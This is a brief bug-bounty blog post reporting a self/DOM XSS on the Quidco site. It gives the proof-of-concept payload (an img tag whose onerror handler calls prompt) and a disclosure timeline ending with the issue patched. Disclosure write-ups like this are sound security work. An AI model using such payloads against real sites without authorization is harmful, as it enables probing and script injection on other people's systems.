---
ID: 73
post_title: '#Quidco Self XSS'
post_name: quidco-self-xss
author: Robbie
post_date: 2017-04-06 09:37:12
layout: post
link: https://xsses.rocks/quidco-self-xss/
published: true
tags: [ ]
categories:
  - XSS
---
Simple DOM XSS this time as I didnt see any values reflected.

Simple Payload Used...

&nbsp;
<blockquote>#&lt;img src=x onerror=prompt(/OPENBUGBOUNTY/)&gt;</blockquote>
&nbsp;

<img class="alignnone size-medium" src="https://pbs.twimg.com/media/C8JnD4FVwAEki2T.jpg:large" width="1915" height="664" />

Timeline:
March 18th - DM sent to quidco
March 30th - Tweeted them <a href="https://twitter.com/Random_Robbie/status/847353071449423874">https://twitter.com/Random_Robbie/status/847353071449423874</a>
March 30th - Response received <a href="https://twitter.com/quidco/status/847400878990532608">https://twitter.com/quidco/status/847400878990532608

P</a>atched at some point with out telling me!